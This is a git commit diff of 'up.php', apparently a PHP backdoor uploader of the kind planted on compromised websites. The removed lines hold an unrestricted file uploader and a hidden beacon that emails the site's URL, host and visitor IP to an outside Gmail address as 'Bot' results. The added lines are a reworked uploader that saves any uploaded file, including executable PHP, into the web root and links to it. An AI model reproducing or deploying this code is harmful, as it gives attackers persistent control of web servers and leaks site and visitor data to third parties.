e443cccaaeff74ab59cc6c6a3b0f1fdf1bc71b58
vodkalavish <nassefyoussfi@gmail.com>
2018-11-15 13:30:52 +0100

    Update up.php

--- up.php
+++ up.php
@@ -1,21 +1,19 @@
-<title>Vuln!! patch it Now! Vodkalavish Uploader</title>
 <?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Successfully Uploaded ! :)<b><br><br>'; }
-else { echo '<b>Not uploaded ! </b><br><br>'; }
+echo "vodkalavish";
+if(isset($_POST['Submit'])){
+    $filedir = "";
+    $maxfile = '2888888';
+ 
+    $file_name = $_FILES['image']['name'];
+    $temporari = $_FILES['image']['tmp_name'];
+    if (isset($_FILES['image']['name'])) {
+        $abod = $filedir.$file_name;
+        @move_uploaded_file($temporari, $abod);
+ 
+echo"<center><b>Link ==> <a href='$file_name' target=_blank>$file_name</a></b></center>";
 }
-?>
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = " Bot v6 Rzlt |$ip";
-$email = "thug0506@gmail.com";
-$from = "From: Result<botv3@mrspybotv3.com";
-$a45 = $_SERVER['REQUEST_URI'];
-$b75 = $_SERVER['HTTP_HOST'];
-$m22 = $ip . "";
-$msg8873 = "$a45 $b75 $m22";
-mail($email, $subj98, $msg8873, $from);
-?>
+}
+else{
+echo'
+<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
+} 
